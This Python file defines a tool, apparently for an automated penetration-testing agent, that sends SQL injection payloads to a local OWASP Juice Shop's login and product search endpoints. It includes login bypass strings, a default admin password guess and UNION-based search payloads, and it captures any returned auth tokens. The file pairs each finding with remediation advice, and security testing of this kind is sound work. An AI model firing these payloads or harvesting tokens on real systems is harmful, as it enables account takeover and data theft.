"""Juice Shop-specific SQL injection probes."""

from __future__ import annotations

from typing import Any

from pydantic import BaseModel, Field

from .base import tool
from .http_tool import _get_client


class SQLInjectionTesterParams(BaseModel):
    include_search_tests: bool = Field(
        default=True,
        description="Also test the product search endpoint for SQLi-style behavior.",
    )
    include_login_tests: bool = Field(
        default=True,
        description="Test Juice Shop login with common SQLi authentication bypass payloads.",
    )


@tool(
    name="sql_injection_tester",
    description=(
        "Run bounded SQL injection probes against local Juice Shop login and "
        "search endpoints. Captures status, response signatures, and any auth token."
    ),
    params=SQLInjectionTesterParams,
)
def sql_injection_tester(
    include_search_tests: bool = True,
    include_login_tests: bool = True,
) -> dict[str, Any]:
    client = _get_client()
    evidence: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    auth_token: str | None = None
    auth_tokens: list[dict[str, str]] = []

    if include_login_tests:
        payloads = [
            {"email": "' or 1=1--", "password": "anything"},
            {"email": "admin@juice-sh.op'--", "password": "anything"},
            {"email": "bender@juice-sh.op'--", "password": "anything"},
            {"email": "jim@juice-sh.op'--", "password": "anything"},
            {"email": "admin@juice-sh.op", "password": "' or 1=1--"},
            {"email": "admin@juice-sh.op", "password": "admin123"},
        ]
        for body in payloads:
            try:
                response = client.post("/rest/user/login", json=body)
                data = {}
                try:
                    data = response.json()
                except Exception:
                    pass
                token = data.get("authentication", {}).get("token") if isinstance(data, dict) else None
                user = data.get("authentication", {}).get("umail") if isinstance(data, dict) else None
                item = {
                    "endpoint": "POST /rest/user/login",
                    "payload": {"email": body["email"], "password": body["password"]},
                    "status": response.status_code,
                    "user": user,
                    "has_token": bool(token),
                    "body_excerpt": response.text[:220],
                }
                evidence.append(item)
                if token:
                    auth_token = auth_token or token
                    auth_tokens.append({"user": str(user), "token": token})
                    if "'" in body["email"] or "'" in body["password"]:
                        findings.append(
                            {
                                "title": "Authentication bypass via SQL injection",
                                "severity": "Critical",
                                "endpoint": "POST /rest/user/login",
                                "evidence": item,
                                "reproduction": (
                                    "Submit the recorded SQLi payload to /rest/user/login "
                                    "with any password and observe a valid authentication token."
                                ),
                                "remediation": (
                                    "Use parameterized queries for authentication lookup, compare "
                                    "password hashes only after selecting an exact user record, and "
                                    "add negative tests for classic OR/UNION/comment payloads."
                                ),
                            }
                        )
                    else:
                        findings.append(
                            {
                                "title": "Weak default administrator password",
                                "severity": "High",
                                "endpoint": "POST /rest/user/login",
                                "evidence": item,
                                "reproduction": (
                                    "Submit admin@juice-sh.op with the recorded weak password and "
                                    "observe a successful administrator login."
                                ),
                                "remediation": (
                                    "Reject common/default passwords, enforce password rotation for "
                                    "seeded admin accounts, and monitor privileged login attempts."
                                ),
                            }
                        )
            except Exception as exc:
                evidence.append(
                    {
                        "endpoint": "POST /rest/user/login",
                        "payload": body,
                        "error": f"{type(exc).__name__}: {exc}",
                    }
                )

    if include_search_tests:
        search_payloads = ["'))--", "test' OR 1=1--", "' UNION SELECT 1,2,3--"]
        baseline_count: int | None = None
        try:
            baseline = client.get("/rest/products/search", params={"q": "apple"})
            baseline_json = baseline.json()
            baseline_data = baseline_json.get("data", []) if isinstance(baseline_json, dict) else []
            baseline_count = len(baseline_data)
            evidence.append(
                {
                    "endpoint": "GET /rest/products/search?q=apple",
                    "status": baseline.status_code,
                    "result_count": baseline_count,
                    "body_excerpt": baseline.text[:300],
                }
            )
        except Exception as exc:
            evidence.append({"endpoint": "GET /rest/products/search", "error": str(exc)})

        for payload in search_payloads:
            try:
                response = client.get("/rest/products/search", params={"q": payload})
                body = response.text
                result_count = None
                try:
                    parsed = response.json()
                    data = parsed.get("data", []) if isinstance(parsed, dict) else []
                    result_count = len(data)
                except Exception:
                    pass
                item = {
                    "endpoint": "GET /rest/products/search",
                    "payload": payload,
                    "status": response.status_code,
                    "result_count": result_count,
                    "body_excerpt": body[:500],
                }
                evidence.append(item)
                body_lower = body.lower()
                if response.status_code >= 500 or "sqlite" in body_lower or "syntax" in body_lower:
                    findings.append(
                        {
                            "title": "Product search exposes SQL error behavior",
                            "severity": "High",
                            "endpoint": "GET /rest/products/search",
                            "evidence": item,
                            "reproduction": (
                                "Send the recorded payload as the q parameter and compare the "
                                "SQL/error response to a normal product search."
                            ),
                            "remediation": (
                                "Bind q as a parameterized value, avoid returning raw database "
                                "errors, and centralize query construction in a tested data-access layer."
                            ),
                        }
                    )
                elif baseline_count is not None and result_count is not None and result_count > baseline_count + 5:
                    findings.append(
                        {
                            "title": "Product search may be broadened by SQL boolean logic",
                            "severity": "High",
                            "endpoint": "GET /rest/products/search",
                            "evidence": item,
                            "reproduction": (
                                "Compare a normal q=apple search with the recorded boolean payload; "
                                "the injected search returns many more rows."
                            ),
                            "remediation": (
                                "Parameterize search queries and restrict wildcard expansion to "
                                "application-controlled syntax rather than raw SQL fragments."
                            ),
                        }
                    )
            except Exception as exc:
                evidence.append(
                    {
                        "endpoint": "GET /rest/products/search",
                        "payload": payload,
                        "error": f"{type(exc).__name__}: {exc}",
                    }
                )

    return {
        "auth_token": auth_token,
        "auth_tokens": auth_tokens,
        "findings": findings,
        "evidence": evidence,
        "summary": f"SQLi tester captured {len(evidence)} observations and {len(findings)} findings.",
    }
